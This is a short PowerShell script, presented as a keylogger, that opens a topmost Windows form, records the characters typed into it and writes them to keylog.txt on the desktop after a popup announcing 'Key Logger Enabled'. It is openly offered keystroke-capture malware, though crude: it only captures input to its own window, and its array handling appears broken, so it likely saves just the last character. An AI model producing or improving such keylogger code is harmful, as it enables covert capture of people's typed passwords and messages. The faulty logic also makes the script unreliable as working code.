# Create a WSH Shell object
$wshell = New-Object -ComObject Wscript.Shell

# Display the pop-up notification
$wshell.Popup("true", 0, "Key Logger Enabled", 0x0)

# Load the necessary assembly for keyboard input
Add-Type -AssemblyName System.Windows.Forms

# Get the path to the desktop
$desktopPath = [Environment]::GetFolderPath("Desktop")
$outputFile = Join-Path $desktopPath "keylog.txt"

# Create an empty array to store key presses
$keyPresses = @()

# Function to handle key press events
$keyLogger = {
    param($key)
    
    $keyPress = $key.KeyChar
    if ($keyPress) {
        $keyPresses += $keyPress
        $keyPresses -join '' | Out-File -FilePath $outputFile
    }
}

# Create a form to capture key presses
$form = New-Object Windows.Forms.Form
$form.TopMost = $true
$form.Add_KeyPress($keyLogger)

# Show the form and start the application loop
[Windows.Forms.Application]::Run($form)
